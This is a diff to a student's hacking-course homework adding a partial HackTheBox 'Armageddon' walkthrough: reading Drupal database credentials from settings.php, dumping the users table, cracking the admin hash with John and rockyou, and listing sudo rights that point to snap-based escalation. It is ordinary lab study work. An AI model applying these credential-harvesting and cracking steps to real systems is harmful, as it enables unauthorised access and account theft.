@@ -232,7 +232,58 @@ Solutions for week five [assignments](https://terokarvinen.com/2021/hakkerointi-
 
 ## h) Hack a box from HackTheBox
 
-TBA.
+I already had access to Armaggeddon machine, so I wanted to continue to see, if I could get root access.
+
+I started by looking at what user I was and what files I had access to. I noticed I was the apache user and I had access to /var/www/html directory, which is the web servers directory.
+
+I started browsing what files there were and I found one particularly intereseting file at /var/www/html/sites/default/settings.php, which contained the login credentials to the database.
+
+- Next I started browsing the database for interesting information:
+
+  ```shell
+  mysql --host localhost --user drupaluser --password --database drupal
+  use drupal;
+  select * from users;
+  show;
+  ```
+
+- I got the hashed passwords, that I needed to solve
+
+  | uid | name | pass | mail | theme | signature | signature_format | created | access |
+  |-|-|-|-|-|-|-|-|-|
+  |0|NULL|0|0|0|0|NULL|0|NULL|
+  |1|brucetherealadmin|$HASH_REMOVED_AS_BOX_IS_ACTIVE|admin@armageddon.eu|filtered_html|1606998756|1620130642|1620129461|1|Europe/London|0|admin@armageddon.eu|a:1:{s:7:"overlay";i:1;}|
+  |3|test|$HASH_REMOVED_AS_BOX_IS_ACTIVE|test@htb.eu|filtered_html|1620103868|0|0|0|Europe/London|0|test@htb.eu|NULL|
+  |4|ramkrishna|$HASH_REMOVED_AS_BOX_IS_ACTIVE|darkmovestudios@gmail.com|filtered_html|1620104172|0|0|0|Europe/London|0|darkmovestudios@gmail.com|NULL|
+  |5|gml63248|$HASH_REMOVED_AS_BOX_IS_ACTIVE|gml63248@zwoho.com|filtered_html|1620117834|0|0|0|Europe/London|0|gml63248@zwoho.com|NULL|
+
+- I decided to try and see, if I could crack the hash with John
+
+  ```shell
+  echo -n $BRUCEPASSWORDHAS > bruce.txt
+  john bruce.txt -w$(zcat /usr/share/wordlists/rockyou.tgz)
+  ```
+
+- One match found for brucetherealadmin's password and I managed to login as bruce with that password
+- I tried to list bruces sudo permissions
+
+  ```shell
+  sudo -l
+
+  Matching Defaults entries for brucetherealadmin on armageddon:
+      !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
+      LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+      LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+      XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+  User brucetherealadmin may run the following commands on armageddon:
+      (root) NOPASSWD: /usr/bin/snap install *
+  ```
+
+- Additionally I found a file called users.txt, that from bruces home directory that contained some kind of a hash
+- At this point I had no idea what to do so I started researching on how to exploit snap
+
+<b>TBA Later!</b>
 
 ---
 
